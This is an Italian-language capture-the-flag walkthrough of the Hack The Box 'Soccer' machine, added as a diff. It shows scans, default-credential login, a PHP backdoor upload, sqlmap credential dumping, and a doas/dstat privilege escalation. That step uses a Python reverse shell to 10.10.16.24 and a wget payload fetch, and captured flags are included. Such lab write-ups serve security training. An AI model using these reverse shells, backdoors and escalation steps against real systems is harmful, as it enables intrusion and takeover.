@@ -1,0 +1,222 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.11.194
+
+PORT     STATE SERVICE         REASON  VERSION
+22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
+|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
+|   256 5797565def793c2fcbdb35fff17c615c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
+80/tcp   open  http            syn-ack nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soccer.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+9091/tcp open  xmltec-xmlmail? syn-ack
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src 'none'
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 139
+|     Date: Fri, 28 Apr 2023 13:47:57 GMT
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>Error</title>
+|     </head>
+|     <body>
+|     <pre>Cannot GET /</pre>
+|     </body>
+|     </html>
+|   HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 404 Not Found
+|     Content-Security-Policy: default-src 'none'
+|     X-Content-Type-Options: nosniff
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 143
+|     Date: Fri, 28 Apr 2023 13:47:58 GMT
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>Error</title>
+|     </head>
+|     <body>
+|     <pre>Cannot OPTIONS /</pre>
+|     </body>
+|_    </html>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9091-TCP:V=7.93%I=7%D=4/28%Time=644BCE86%P=x86_64-pc-linux-gnu%r(in
+SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
+SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
+SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
+SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
+SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
+SF:ntent-Length:\x20139\r\nDate:\x20Fri,\x2028\x20Apr\x202023\x2013:47:57\
+SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
+SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
+SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
+SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
+SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
+SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
+SF:r\nDate:\x20Fri,\x2028\x20Apr\x202023\x2013:47:58\x20GMT\r\nConnection:
+SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
+SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
+SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
+SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
+SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
+SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Fri,\
+SF:x2028\x20Apr\x202023\x2013:47:58\x20GMT\r\nConnection:\x20close\r\n\r\n
+SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
+SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
+SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
+SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
+SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
+SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
+SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
+SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
+SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+
+sudo echo "10.10.11.194  soccer.htb" >> /etc/hosts
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.11.194 -w /usr/share/wordlists/dirb/common.txt
+
+Abbiamo trovato 
+/.htaccess 
+/.htpasswd
+/tiny
+
+---------------------------------------------------------------------------------------------------------------
+Analizziamo la cartella /tiny
+C'è un link nella pagina -> https://tinyfilemanager.github.io/
+Nel repository troviamo queste 2 credenziali
+'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123  -> Funziona
+'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
+
+Entriamo come admin e ci troviamo di fronte ad una lista di file, dove apparentemente possiamo fare l'upload.
+Proviamo a caricare una backdoor in php
+
+nc -nvlp 2929
+http://soccer.htb/tiny/uploads/backdoor.php
+
+Shell ottenuta
+---------------------------------------------------------------------------------------------------------------
+Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+Troviamo questo subdomain -> soc-player.soccer.htb
+Lo aggiungiamo al file hosts
+
+Entriamo sul sito ed effettuiamo il sign up e il login
+si apre la pagina  -> http://soc-player.soccer.htb/check -> Your Ticket Id: 79775
+
+Analizzando la pagina, c'è una chiamata ad una socket
+
+
+var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
+window.onload = function () {
+
+var btn = document.getElementById('btn');
+var input = document.getElementById('id');
+
+ws.onopen = function (e) {
+    console.log('connected to the server')
+}
+input.addEventListener('keypress', (e) => {
+    keyOne(e)
+});
+
+function keyOne(e) {
+    e.stopPropagation();
+    if (e.keyCode === 13) {
+        e.preventDefault();
+        sendText();
+    }
+}
+
+function sendText() {
+    var msg = input.value;
+    if (msg.length > 0) {
+        ws.send(JSON.stringify({
+            "id": msg
+        }))
+    }
+    else append("????????")
+}
+}
+
+ws.onmessage = function (e) {
+append(e.data)
+}
+
+function append(msg) {
+let p = document.querySelector("p");
+// let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
+// p.style.color = randomColor;
+p.textContent = msg
+}
+---------------------------------------------------------------------------------------------------------------
+Creiamo uno script python -> Vedi script.py
+Ed eseguiamo un sqlmap -> sqlmap -u "http://localhost:8081/?id=1" -p “id”
+
+Troviamo le seguenti credenziali
+id: 1234
+email: player@player.htb
+username: player
+password: PlayerOftheMatch2022
+
+proviamo a collegarci -> ssh player@10.10.11.194 -> CONNESSI
+
+cat home/player/user.txt -> 270c1d92c270b35116710bf4138bee2a
+
+---------------------------------------------------------------------------------------------------------------
+Cerchiamo se l'utente è tra i sudoers
+sudo -l -> Niente da fare
+
+Cerchiamo se l'utente ha SUID
+find / -perm -u=s -type f 2>/dev/null 
+
+Troviamo qualcosa di interessante.
+/usr/local/bin/doas -> Doas is a utility that allows a user account to run a command as another user account. Or in other words, do it as someone else (hence "doas"). 
+
+find / -type f -name "doas.conf" 2>/dev/null
+cat /usr/local/etc/doas.conf -> permit nopass player as root cmd /usr/bin/dstat
+
+Creo un file su dstat, provo a eseguirlo ma non va a buon fine.
+import os
+os.system('chmod +s /usr/bin/bash')
+
+Provo con una backdoor
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((“10.10.16.24”,2929));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+import pty; pty.spawn(“/bin/sh”)
+
+wget http://10.10.16.24:9000/Soccer/dstat_cyberw1ng.py
+
+nc -nvlp 2929
+doas -u root /usr/bin/dstat --cyberw1ng -> SHELL OTTENUTA
+---------------------------------------------------------------------------------------------------------------
+cat /root/root.txt -> a166b474ae7796ca692564988d7bc003
